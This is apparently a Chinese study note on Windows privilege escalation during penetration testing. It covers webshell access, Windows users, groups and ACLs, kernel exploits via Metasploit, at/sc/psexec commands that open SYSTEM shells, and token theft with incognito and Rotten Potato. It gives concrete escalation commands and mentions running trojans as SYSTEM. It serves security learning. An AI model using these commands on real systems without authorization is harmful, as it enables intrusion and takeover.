![](https://img-blog.csdnimg.cn/cb7614b418be48f4ae1a82f56bcf1f57.png)

# 权限提升

权限提升有小迪总结的pdf,在`网络安全---WEB---学习资料---wang luo an quan-master---权限提升-linux提权手法总结中`

渗透分为前渗透和后渗透，前渗透是对网站的渗透，后渗透是内网渗透等，想要进行内网渗透的前提是获得内网一台主机的权限，当前渗透完成之后，就需要通过权限提升获取到开启后渗透的钥匙

权限提升简称提权，由于操作系统都是多用户操作系统，用户之间都有权限控制，比如通过 Web 漏洞拿到的是 Web 进程的权限，往往 Web 服务都是以一个权限很低的账号启动的，因此通过 Webshell 进行一些操作会受到限制，这就需要将其提升为管理甚至是 System 权限。通常通过操作系统漏洞或操作系统的错误配置进行提权，也可以通过第三方软件服务，如数据库或 FTP 等软件的漏洞进行提权。

对于一个网站的渗透，通常权限级别有webshell【网站权限】，其他权限【数据库，接口，服务类】，服务器系统权限

只有到了服务器系统权限，才能对内网进行安全测试

###### 有哪些权限

- 权限提升就是围绕下列权限进行的

- 后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等

- 1.后台权限：（获取方式：爆破，注入猜解，弱口令等获取的账号密码配合登录）

  - 一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件等。（如后台功能存在文件操作的话也可以操作文件数据）

- 2.网站权限：

  - 查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。

- 3.数据库权限：（获取方式：源码或配置文件泄露，也可能是网站权限webshell进行的数据库配置文件读取获得）

  - 操作数据库的权限，数据库的增删改等。

- 4.接口权限：（邮件，短信，支付，第三方登录等）

  接口权限基于获取到了后台权限或者网站权限，后台权限可以通过修改配置信息功能点等操作获取接口权限，网站权限可以通过查看配置文件获取接口权限等

需要注意的是，无论是哪个权限，都是基于本地用户的。

## - webshell【网站权限】

[58：权限提升-网站权限后台漏洞第三方获取 - zhengna - 博客园⁤ (cnblogs.com)](https://www.cnblogs.com/zhengna/p/15200645.html)

给网站上传了webshell就能拿到运行这个网站用户的权限，俗称网站权限

想要获取到webshell级别的漏洞，需要利用前期学到的网站漏洞通过各方面的配合【如组合漏洞，第三方漏洞】

#### 通过网站后台获取权限

首先，进入网站后台不代表获取了网站权限，后台的级别仍然比网站权限低

思路是先判断网站是否为已知程序，可以进行类似cms判断的操作，

- 进入网站后台后，需要借助漏洞或者网上资料来进行类似上传一句话木马的操作获取webshell权限

###### 如果是已知程序怎么做

如果是已知程序，则可以通过网上资料或者开源白盒代码审计获取权限，，有时可以白盒代码审计和功能点挖掘配合进行

白盒审计的话就是去网站下载同样的程序，然后查看源码，文件结构，默认敏感文件目录

**eg:**

以一个网站为例，用网站自带的控制器中的网络功能查看数据可以发现关键字：`server:Apache/2.4.23（win32) OprnSSL/j php/5.4.45`这是在phpstudy【中间件】上搭建，然后去网上搜带了符合该phpstudy的远程执行命令漏洞，阅读exp，通过postman抓包利用漏洞

###### 如果是未知程序怎么做

如果未知，则需要通过查看网站后台的功能点进行web漏洞利用获取权限

[浅谈“phpinfo()信息泄漏”_phpinfo.php信息泄露 漏洞级别-CSDN博客](https://blog.csdn.net/weixin_39934520/article/details/107022162)

#### 通过单点漏洞获取权限

和上面的功能点原理差不多，但是范围扩充到了整个网站

#### 通过第三方漏洞获取权限

想要获取网站权限，还可以利用如编辑器，中间件平台，phpadmin等第三方的漏洞来获取网站权限

phpMyAdmin 是一个用PHP编写的软件工具，可以通过web方式控制和操作MySQL数据库。通过phpMyAdmin 可以完全对数据库进行操作，例如建立、复制和删除数据等等。

eg:

确定了目标采用了苏丹GlassFish中间件，4848端口

去网上搜集到了glassfish任意文件读取漏洞，利用exp并适配一下目标服务器，实现任意文件读取，然后读取敏感信息，尝试获取webshell权限

## - 服务器系统权限

![](https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210902150052482-1569737443.png)

![](https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210909135557690-2136273391.png)





[59：权限提升-Win溢出漏洞及AT&SC&PS提权 - zhengna - 博客园 (cnblogs.com)](https://www.cnblogs.com/zhengna/p/15204394.html)

按服务器操作系统分为linux和windows

### 必备知识

#### windows权限认识（用户及用户组）

Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions),它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这些用户账户也将具备该组所拥有的权限。

##### **0x01 普通权限**

默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)。其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。

管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。　　

##### **0x02特殊权限**

　　除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是:SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者) 等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。
　　真正拥有“完全访问权”的只有一个成员:SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。
　　“所有人”权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限——任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员。
　　被标记为“创建者”权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。
　　但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。
　　无论是普通权限还是特殊权限，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组再加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加”的使用就能减轻一部分劳动量了。

#### 用户，组，访问控制

[Windows的权限（用户、组和访问控制）_windows用户权限-CSDN博客](https://blog.csdn.net/fuhanghang/article/details/128786603?utm_medium=distribute.pc_feed_404.none-task-blog-2~default~BlogCommendFromBaidu~activity-1-128786603-blog-null.262^v1^pc_404_mixedpudn&depth_1-utm_source=distribute.pc_feed_404.none-task-blog-2~default~BlogCommendFromBaidu~activity-1-128786603-blog-null.262^v1^pc_404_mixedpud)

##### **用户账户与组账户**

###### **用户账户**

Windows的用户帐户是对计算机用户身份的识别，且本地用户帐户和密码信息是存储在本地计算机上的

【即由：安全账户管理器（Security Accounts Manager）负责SAM（Security Accounts Manager）数据库的控制和维护；[SAM](https://so.csdn.net/so/search?q=SAM&spm=1001.2101.3001.7020)数据库则是位于注册表的 `计算机\HKEY_LOCAL_MACHINE\SAM\SAM` 下，受到ACL保护】

SAM文件在 `C:\Windows\System32\config` 路径下。SAM对应的进程：lsass.exe （Local Security Authority Process）。

通过本地用户和组，可以为用户和组分配权利和权限，从而限制用户和组执行某些操作的能力。 不同的用户身份拥有不同的权限，每个用户包含一个名称和一个密码，用户帐户拥有唯一的安全标识符(Security Identifier，[SID](https://so.csdn.net/so/search?q=SID&spm=1001.2101.3001.7020))。

- 如果我们去[进程管理](https://so.csdn.net/so/search?q=进程管理&spm=1001.2101.3001.7020)里面杀死 lsass.exe 进程时，windows会提示遇到错误，然后关机

##### **默认账户与命令**

用户账户分为两种类型：**【本地用户账号】**和**【全局用户账号(也叫：域用户账号)】**

①**本地用户账号**是创建于本地计算机（它的作用范围：仅仅限于创建它的计算机，控制用户对本地计算机上的资源访问）。

②**全局用户账号**创建于域服务器，可以在网络中的任意计算机上加入域后使用，使用范围是整个域网络。

| 默认用户账户       | 含义                 | 说明                                                         |
| ------------------ | -------------------- | ------------------------------------------------------------ |
| Administrator      | 管理员用户           | 管理计算机(域)的内置帐户（默认禁用）                         |
| DefaultAccount     | 默认账户             | 系统管理的用户帐户（默认禁用）                               |
| defaultuser0       | 默认用户             | （默认禁用）                                                 |
| Guest              | 来宾用户             | 提供给访客人员使用（默认禁用）                               |
| WDAGUtilityAccount | Windows Defender用户 | 系统为 Windows Defender 应用程序防护方案管理和使用的用户帐户（默认禁用） |

| Windows组件关联的用户 | 含义         | 说明                                      |
| --------------------- | ------------ | ----------------------------------------- |
| System                | 本地系统用户 | 为windows的核心组件访问文件等资源提供权限 |
| Local Service         | 本地服务用户 | 预设的拥有最小权限的本地账户              |
| Network Service       | 网络服务用户 | 具有运行网络服务权限的计算机账户          |

- System > Administrator > User > Guest

| 序号 | 命令                                        | 命令说明                                |
| ---- | ------------------------------------------- | --------------------------------------- |
| 1    | net user                                    | 查看系统账户                            |
| 2    | net user Cm0001 123456 /add                 | 创建用户是：Cm0001 密码是：123456的账户 |
| 3    | net user Cm0001 987654                      | 修改用户Cm0001的密码为987654            |
| 4    | net user Cm0001                             | 查看用户Cm0001的属性                    |
| 5    | net  localgroup  administrators Cm0001 /add | 提升用户Cm0001的权限为管理员            |
| 6    | net user Cm0001 123456 /del                 | 删除用户Cm0001                          |

###### 组账户

组账户是一些用户的集合；且组内的用户自动拥有组所设置的权限。

> ①组账户是用户账户的集合，用于组织用户账户；
>
> ②为一个组授予权限后，则该组内的所有成员用户自动获得改组的权限；
>
> ③一个用户账户可以隶属于多个组，而这个用户的权限就是所有组的权限的**合并集**。

------







###### 默认组账户与命令

| 内置的组账户名称     | 含义           | 说明                                                         |
| -------------------- | -------------- | ------------------------------------------------------------ |
| Administrators       | 管理员组       | 默认情况下Administrator中的用户对计算机 / 域有不受限制的完全访问权，功能有：①管理文件：Windows系统中，系统磁盘中的文件只能由Administrators组的账户进行更改②更改系统安全设置：安装新的功能、更改计算机网络设置、对服务器选项进行设置，这些操作都需要Administraotors组中的用户进行操作。如果用户的权限不够，选择管理员用户进行操作。默认情况下，Adminiistrator账户处于禁用状态 当它处于请用状态时，Administrator账户具有对计算机的完全控制权限，并根据需要向用户分配权力和访问控制权限，该账户必须仅用于需要管理凭据任务 强烈建议Administrator设置为强密码 永远不可以从管理员组删除Adminsitrator账户，但是可以重命名或禁用该账户 |
| Guests               | 来宾用户组     | 提供给没有用户帐户但是需要访问本地计算机内资源的用户使用，该组的成员无法永久地改变其桌面的工作环境。该组最常见的默认成员为用户帐号Guest。①通常这个账户没有修改系统设置和进行安装程序的权限；②也没有创建修改任何文档的权限，只能读取计算机系统信息和文件 在windows系统中，Guest账户被任务是不安全的权限账户。③默认情况下禁用Guest用户。而且此账户默认为Guests组成员，改组允许用户登陆计算机，其他权力及任何权限都必须由管理员组中的用户成员给与Guests组 |
| Power Users          | 功能用户组     | 组内的用户具备比Users组更多的权利，但是比Administrators组拥有的权利更少一些，例如，可以：创建、删除、更改本地用户帐户；创建、删除、管理本地计算机内的共享文件夹与共享打印机；自定义系统设置，例如更改计算机时间、关闭计算机等。①不可以更改Administrators；②无法夺取文件的所有权；③无法备份与还原文件；④无法安装删除与删除设备驱动程序；⑤无法管理安全与审核日志。 |
| Users                | 标准用户组     | Users组账户权限低于Adiministraotrs组的账户，但高于Guests组账户。①Users组用户可以进入“网络和共享中心”，并查看网络连接状态，但无法修改连接属性；②Users组用户也无法关闭防火墙；③Users组用户无法安装软件；④Users组用户也无法对该用户文件夹以为的C盘进行修改。 |
| Remote Desktop Users | 远程桌面用户组 | 组内的成员拥有远程桌面登录的权限；默认Administrators组内的成员都拥有远程桌面的权限 。Remote Desktop Users组的作用就是保障远程桌面服务的安全运行，一旦赋予Administrator组远程桌面的权限，就像是为入侵者省略了提权的步骤。相对于改变用户组权限，将需要连接远程桌面的用户分到Remote Desktop Users组中是一中更加安全的方式 |

  **动态包含成员内置组的成员由Windows程序“自动添加” ，Windows会根据用户的状态来决定用户所属的组 ，组内的成员也随之动态变化，无法修改 。**

| 序号 | 动态包含成员内置组  | 说明                                                         |
| ---- | ------------------- | ------------------------------------------------------------ |
| 1    | Interactive         | 动态包含在本地登录的用户                                     |
| 2    | Authenticated Users | 任何一个利用有效的用户帐户连接的用户都属于这个组；**建议在设置权限时，尽量针对Authenticated Users组进行设置**，而不要针对Everone进行设置。 |
| 3    | Everyone            | 任何一个用户都属于这个组。**注意，如果Guest帐号被启用时，则给Everone这个组指派权限时必须小心，因为当一个没有帐户的用户连接计算机时，他被允许自动利用Guest帐户连接，但是因为Guest也是属于Everone组，所以他将具备Everyone所拥有的权限**。 |





| 序号 | 命令                                        | 命令说明                                |
| ---- | ------------------------------------------- | --------------------------------------- |
| 1    | net user                                    | 查看系统账户                            |
| 2    | net user Cm0001 123456 /add                 | 创建用户是：Cm0001 密码是：123456的账户 |
| 3    | net user Cm0001 987654                      | 修改用户Cm0001的密码为987654            |
| 4    | net user Cm0001                             | 查看用户Cm0001的属性                    |
| 5    | net  localgroup  administrators Cm0001 /add | 提升用户Cm0001的权限为管理员            |
| 6    | net user Cm0001 123456 /del                 | 删除用户Cm0001                          |

| 序号 | 组命令                                          | 说明                                     |
| ---- | ----------------------------------------------- | ---------------------------------------- |
| 1    | net localgroup                                  | 查看系统的组                             |
| 2    | net localgroup testgroup /add                   | 新建一个testgroup的组                    |
| 3    | net localgroup testgroup Cm0001 /add            | 将用户Cm0001加入testgroup组中            |
| 4    | net localgroup testgroup                        | 查看testgroup组内的成员                  |
| 5    | net localgroup testgroup Cm0001 /del            | 将用户Cm0001从testgroup组中移除          |
| 6    | net localgroup testgroup /del                   | 删除testgroup组                          |
| 7    | net localgroup "remote desktop users" hack /add | 将用户hack加入remote desktop users组中   |
| 8    | net localgroup "remote desktop users"           | 查看remote desktop users组内的成员       |
| 9    | net localgroup "remote desktop users" hack /del | 将用户hack从remote desktop users组中移除 |

Demote Desktop Users为远程桌面用户组，默认Administrators都拥有远程桌面的权限

Administrators是唯一可以更改系统磁盘文件的用户组，永远不可以从Administrators组删除Adminsitrator账户，但是可以重命名或禁用该账户

##### 访问控制

Windows的访问控制列表(Access Control List)：访问权限决定着某个用户可以访问的文件和目录 对于每一个文件和文件夹，由安全描述符(SD)规定了安全数据、安全描述符决定安全设置是否对当前目录有效，或者它可以被传递给其他文件和目录。

当一个用户试图访问一个文件或者文件夹的时候，NTFS 文件系统会检查用户使用的帐户或者账户所属的组是否在此文件或文件夹的访问控制列表（ACL）中。如果存在，则进一步检查访问控制项 ACE，然后根据控制项中的权限来判断用户最终的权限。

###### windows的访问控制

| 访问控制名称               | 含义                | 说明                                                         |
| -------------------------- | ------------------- | ------------------------------------------------------------ |
| Access Control List        | 访问控制列表(ACL)   | 访问权限决定着某个用户可以访问的文件和目录 对于每一个文件和文件夹，由安全描述符(SD)规定了安全数据 安全描述符决定安全设置是否对当前目录有效，或者它可以被传递给其他文件和目录 |
| Access Control environment | 访问控制环境（ACE） | 访问控制项ACE，是指访问控制实体，用于指定特定用户/组的访问权限，是权限控制的最小单位。①完全控制：对文件或者文件夹可执行所有操作；②修改：可以修改、删除文件或文件夹；③读取和执行：可以读取内容，并且可以执行应用程序；④列出文件夹目录：可以列出文件夹内容，此权限只针对文件夹存在，文件无此权限；⑤读取：可以读取文件或者文件夹的内容；⑥写入：可以创建文件或者文件夹；⑦特别的权限：其他不常用的权限，比如删除权限的权限； |
| New Technology File System | 文件系统（NTFS）    | 文件夹的NTFS权限 (文件夹内的文件或文件夹会默认继承上一级目录的权限)。①完全控制：对文件或者文件夹可执行所有操作②修改：可以修改、删除文件或文件夹③读取和执行：可以读取内容，并且可以执行应用程序④读取：可以读取文件的内容⑤写入：可以修改文件的内容⑥特殊权限：其他不常用的权限，比如删除权限的权限 |
| Security Identifiers       | 安全标识符（SID）   | **SID的说明：**  安全标识符是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 [SID](https://so.csdn.net/so/search?q=SID&spm=1001.2101.3001.7020)。Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。安全标识符也被称为安全 ID 或 SID。**SID的作用：**  用户通过验证后，登陆进程会给用户一个访问令牌，该令牌相当于用户访问系统资源的票证，当用户试图访问系统资源时，将访问令牌提供给 Windows NT，然后 Windows NT 检查用户试图访问对象上的访问控制列表。如果用户被允许访问该对象，Windows NT将会分配给用户适当的访问权限。 访问令牌是用户在通过验证的时候有登陆进程所提供的，所以改变用户的权限需要注销后重新登陆，重新获取访问令牌。 |

###### 命令查看sId

```
//查看系统当前用户的SID
whoami /user
//查看所有用户的SID
wmic useraccount get name,sid
```

###### 用户访问控制

 用户帐户控制（User Account Control，简称：UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。

原理是：通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。

UAC要求用户在执行可能影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供一个确认的对话框窗口，使用户可以在执行之前对其进行验证，UAC可以帮助防止恶意软件和间谍软件在未经许可的情况下在计算机上进行安装或对计算机进行更改。

[Windows访问控制 | Windows Access Control (gitbook.io)](

#### windows常用提权命令

![](C:\Users\19746\Desktop\网络安全\图片\windows常见提权命令.png)

`systeminfo >x.txt`  把系统信息保存在x.txt文件中（会写到webshell的同级目录）

- 把信息保存下来是为了后续方便查看，也可以直接systeminfo拿到信息后自己复制粘贴保存到一个文件中

### *windows

#### 区别版本

提取windows服务器权限前需要明确区别目标的针对版本，**分为个人使用和服务器使用**，以下为常见操作系统对应版本

执行命令systeminfo就能获取到该信息，或者其他途径

windows xp

windows7/8/10   (通常为个人)

windows2k3/08（通常为服务器）

windows2012/16（通常为服务器）

#### 区别环境

想提取到服务器权限，需要明确区别目标的针对环境，**分为从WEB上进行提权还是从本地进行提权**

WEB提权：已有网站权限（可以操作网站内容，但无法操作服务器），想要获得服务器权限，进而操作服务器。

本地提权：已经有了服务器的一个普通用户的权限，想要提升到系统权限

WEB提权是拿到webshell级别的权限去提权，本地提权是拿到计算机普通用户级别的权限去提权

本地提权比WEB提权成功概率更高

------

#### windows提权方法有哪些

##### 1.数据库

具体看下面的其他权限的数据库提权

------



##### 2.溢出漏洞

信息收集-补丁筛选-利用MSF(Metasploit，一款kali的收集很多漏洞利用的平台)或特定EXP(网上直接去搜特定cve编号的exp)-执行-权限提升

- 这个也是常用漏洞提权思路

​           优先使用msf,msf上没有再用特定exp

GitHub上有人整理了很多exp，可以搜索一下。

https://github.com/SecWiki/windows-kernel-exploits

https://github.com/unamer/CVE-2018-8120

###### 工具推荐:

**vulmap**(适合于linux，window不好用，.ps1是windows的一种文件，通过powshell运行)，用powershell运行工具vulmap中的.ps1文件会自动检测当前操作系统中的漏洞

- 使用前提：目标服务器必须有powershell功能，想要使用需要启用目标服务器的powershell的功能，可能就需要本地环境下提权才行

**wes**(windows可以，linux不知道）,用python.py执行工具wes中的wes.py文件，第一次使用时会要求安装漏洞库及漏洞库相关文件，按照提示输入执行命令即可

这个工具有一个好处，可以用到WEB环境提权【本地当然也可以】，比如我们之前已经成功把网站的systeminfo信息下到了本地的1.txt文件中，就可以通过命令`python.exe 路径/wes.py 1.txt -o vuln.csy`执行直接查找网站操作系统漏洞并保存到vnln.csv文件中

**windowsVulnScan**，（也需要powershell脚本，不太使用WEB环境下的提权）直接cmd运行工具，根据参数更新KB和exp，使用时需要给目标上传文件KBCollect.ps1，然后在网站上通过powershel运行，之后会生成KB.json文件，里面存的信息和systeminfo命令执行结果差不多。把KB.json拖回本地工具check.py的同级目录，在本地执行命令`python.exe 路径/WindowsVuLnScan/cve-check.py -C -f KB.json`(如果出现类似Unexprcted UTF-8 BOM错误，需要修改KB.json文件的编码为UTF-8)

###### MSF

([【工具使用】——Metasploit(MSF)使用详解(超详细)-CSDN博客](https://blog.csdn.net/weixin_45588247/article/details/119614618))

一般msf需要放到外网一台服务器上才能利用(建议为linux操作系统)，需要用xshell或者向日葵类似的远控软件连接服务器

###### 演示案例

- 基于WEB环境服务器使用的阿里云windows靶机权限提升（溢出漏洞）

已经成功给对面网站上传了.asp文件后门，并通过工具成功连接后门，拿下了网站权限。

首先cmd执行命令`ipconfig`(获取当前ip地址)，然后执行命令`whoami /priv`（获取当前用户权限），执行命令systeminfo获取系统信息（包括操作系统版本，系统类型，修补程序-打过的补丁）

打开外网服务器的msf【msf必须建立在外网使用，本机是内网？此时有外网服务器，本地，目标windows肉鸡三方】

用msf生成后门文件并通过webshell传到目标windows肉鸡上，用msf监听会话，同时通过webshell在网站执行后门文件，实现外网服务器对网站的反弹shell控制

用msf筛选出可以利用的漏洞后，使用msf的命令选择使用特定漏洞的exp，自动进行提权

- 基于本地环境下的权限提升-系统溢出漏洞

一台win7x64的虚拟机，打开后cmd命令行运行whoami得到的是用户名xiaodi，也就是此时为用户权限，然后直接利用cve-2020-0787-Windows本地提权漏洞直接提权到system

------

##### 3.AT&SC&PS命令

[【Windows提权】本地提权AT&SC&PS_windows at提取-CSDN博客](https://blog.csdn.net/weixin_44032232/article/details/114168765)

###### **at:**(win2000,2003,xp)

当我们拿到低权限的用户([webshell](https://so.csdn.net/so/search?q=webshell&spm=1001.2101.3001.7020)用户不能创建计划命令)，通过连接上服务器后，可以通过at命令来进行本地提权。

适用版本：`Win2000 & Win2003 & XP中还是存在的，在Win7以后被剔除`

at命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用的是system权限

eg：

~~~ 
at 12:31 /interactive cmd (在12：31分生成一个交互式的System权限的cmd)
~~~

###### **sc**:(windows 7、8、03、08、12、16)

适用版本：`windows 7、8、03、08、12、16`

eg:

~~~
sc Create systemcmd binPath= "cmd /K start" type= own type= interact
创建一个名为systemcmd的服务，执行命令cmd /K start(启动一个新的cmd窗口)，type=own是指服务这个服务属于谁，type=interact。
sc start systemcmd #启动服务！
~~~

###### **ps:**（admin提权到system,Win2003 & Win2008)

适用版本：`Win2003 & Win2008`

ps只是简称，真正全面是psexec命令，基于工具Pstools实现

Telnet 等实用工具和远程控制程序（如 Symantec 的 PC Anywhere）允许你在远程系统上执行程序，但它们可能很难设置并要求你在想要访问的远程系统上安装客户端软件。 PsExec 是微软自带的工具包，可用于在其他系统上执行进程，为控制台应用程序提供完全交互性，而无需手动安装客户端软件。 PsExec 最强大的用途包括对远程系统和远程启用工具（如 IpConfig）启动交互式命令提示符，否则无法显示有关远程系统的信息。
注意：一些防病毒扫描程序报告一个或多个工具感染了“远程管理员”病毒。 PsTools 中没有含有病毒，但它们已被病毒使用，这就是为什么它们触发病毒通知的原因。

- 服务器版本基本可以， **PC个人电脑具体情况看win10上是否安装对应服务**
  **实战情况下将cmd命令替换成后门路径，以system权限执行木马。**

微软官方工具包：https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools

![](https://img-blog.csdnimg.cn/20210227124930348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzMjIzMg==,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/img_convert/a802be41e183826602c9e403d544bb83.png)

eg:

~~~
psexec.exe -accepteula -s -i -d cmd #调用运行cmd
~~~



[【权限提升】Win本地用户&进程注入&令牌窃取&AT&SC&PS服务命令_title:权限提升-win本地用户&进程注入&令牌窃取&at&sc&ps服务命令-CSDN博客](https://blog.csdn.net/weixin_53009585/article/details/129113253?ops_request_misc=%7B%22request%5Fid%22%3A%22171258238416800211529850%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171258238416800211529850&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-129113253-null-null.142^v100^control&utm_term=at，sc，ps&spm=1018.2226.3001.4187)

##### 4.令牌窃取

[[内网渗透\]—令牌窃取_incognito 提权到system-CSDN博客](https://blog.csdn.net/weixin_54902210/article/details/128460717?ops_request_misc=%7B%22request%5Fid%22%3A%22171280179016800225514341%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171280179016800225514341&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-128460717-null-null.142^v100^control&utm_term=令牌窃取提权&spm=1018.2226.3001.4187)

[令牌窃取原理及利用_令牌窃取提权攻击的原理-CSDN博客](https://blog.csdn.net/p_utao/article/details/108479271?ops_request_misc=%7B%22request%5Fid%22%3A%22171280209216800225527052%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171280209216800225527052&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108479271-null-null.142^v100^control&utm_term=令牌窃取原理&spm=1018.2226.3001.4187)

###### 令牌认知

令牌窃取通常借助工具(例如msf)实现，令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的,当前系统中的某个进程或线程能访问到什么样的系统资源,完全取决于你当前进程是拿着谁的令牌。

令牌的种类有很多，如：

（1）访问令牌(Access Tokem)：表示访问控制操作系统的对象。

（2）会话令牌(Session Token)：是交互会话中唯一身份标识符。

（3）密保令牌(Scecurity Token)：又称认证令牌或硬件令牌，是一种计算机身份检验的物理设备。

Windows的Access Token也有两种类型，如：

（1）授权令牌(Delegation Tokens)：它支持交互式登录，例如远程桌面、用户桌面访问。

（2）模拟令牌(Impersonation Tokens)：它支持非交互式的绘画，例如访问目标共享文件。

两种令牌会在系统重启后才会清除。授权令牌在用户注销后，该令牌会变为模拟令牌，依然起效。

###### 原理：

在假冒令牌攻击中需要使用Kerberost协议。所以在使用假冒令牌前，先来介绍Kerberost协议。Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。Kerberos的工作机制如下图所示：

![](https://img-blog.csdnimg.cn/63b7f5d80a0841f1add545350a0a3cba.png)

客户端请求证书的过程如下：
客户端向认证服务器AS发请求，要求得到服务器的证书；
认证服务器AS收到请求后，将包含客户端密钥的加密证书响应发送给客户端。该证书包括 服务器ticket(包括服务器密钥加密的客户机身份和一份会话密钥)和一个临时加密密钥(又称为 会话密钥，session key) 。当然，认证服务器AS也会给服务器发送一份该证书，用来使服务器认证登录客户端的身份。
客户端将ticket传送到服务器上，服务器确认该客户端端的话，便允许它登录服务器。
客户端登陆成功后，攻击者就可以通过入侵服务器获取客户端的令牌。

[12.2、后渗透测试--令牌窃取_什么是令牌窃取-CSDN博客](https://blog.csdn.net/leiwuhen92/article/details/128303568?ops_request_misc=%7B%22request%5Fid%22%3A%22171290869816800185861286%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171290869816800185861286&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128303568-null-null.142^v100^control&utm_term=令牌窃取原理&spm=1018.2226.3001.4187)

###### 适用版本：

令牌窃取方式在Windows2008之后的高版本操作系统已经没用了，只能用于一些低版本系统。比如

- Microsoft Windows XP Professional SP3和之前版本
- Windows Server 2003 SP2和之前的版本
- Windows Server 2003 x64和x64 SP2
- Windows Server 2003 (用于基于Itanium的系统SP2和先前版本)
- Windows Server 2008 x32 x64
- Windows Server 2008 (用于基于Itanium的系统)
- Windows Vista SP1和之前的版本
- Windows Vista x64 SP1和之前的版本

**流程**：获取会话-利用模块-窃取令牌-提权

###### **演示案例**：

首先打开购买的服务器并通过提前在服务器上下载好的工具msf生成反弹shell程序xx.exe,然后在服务器上开启监听并在肉鸡上直接传一个反弹shell(这里小迪演示时，肉鸡就是虚拟机，所以直接通过文件传输传xx.exe到桌面了，不是通过webshell，模拟的是本地提权)，然后执行，获取到肉鸡的本地普通用户权限，然后使用msf输入以下命令：

~~~cmd
use incognito    ----使用msf的incognito模块
list_tokens -u   ----列出可以窃取的用户令牌，发现了system的用户令牌
impersonate_token "NT AUTHORITY\SYSTEM"   ----窃取system的用户令牌并进行提权
~~~

此时已经提权成功，getuid的结果为system

------

###### win2012-烂土豆配合令牌窃取提权-WEB权限

[62：权限提升-烂土豆&dll劫持&引号路径&服务权限 - zhengna - 博客园 (cnblogs.com)](https://www.cnblogs.com/zhengna/p/15219018.html)

烂土豆下载：https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075

单纯令牌窃取：适用于web权限或本地提权
如配合烂土豆提权：适用于web或数据库等权限

RottenPotato（烂土豆）提权的原理可以简述如下：

通过中间人攻击，将COM（NT\\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。

- 1.欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。
- 2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。
- 3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。

